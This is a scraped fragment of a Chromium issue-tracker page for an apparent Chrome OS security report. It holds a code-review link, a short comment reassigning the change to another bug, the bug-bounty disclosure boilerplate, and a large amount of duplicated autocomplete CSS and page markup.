class="line"><!---->bitset:<!----></span><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<a class="undefined" target="_blank" href="https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723"><!---->https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<!----></a><br><br>Problem Description:<b class="line"><!---->Problem Description:<!----></b><br>above all<span class="line"><!---->above all<!----></span><br><br>Additional Comments:<b class="line"><!---->Additional Comments:<!----></b><br><br><br>Chrome version: <b class="line"><!---->Chrome version: <!----></b>110.0.0.0 <span class="line"><!---->110.0.0.0 <!----></span>Channel: <b class="line"><!---->Channel: <!----></b>Not sure<span class="line"><!---->Not sure<!----></span><br><br>OS:<b class="line"><!---->OS:<!----></b>Chrome OS<span class="line"><!---->Chrome OS<!----></span><mr-comment-content></mr-comment-content>

        Above change is not relate to the bug. It should belong to chromium:1420631<span class="line"><!---->Above change is not relate to the bug. It should belong to chromium:1420631<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users.            issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

            <div>
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              <mr-autocomplete vocabularyname="project" for="targetProjectInput" role="listbox" id="chops-autocomplete-1"><!---->
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">

      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>

       Note: Avoiding 2-way data binding to futureproof this code
        for LitElement. 
      <input id="checkbox" type="checkbox">

 runOnLoad(function() {
 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });
<script type="text/javascript" nonce="">
 runOnLoad(function() {
 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });
</script>
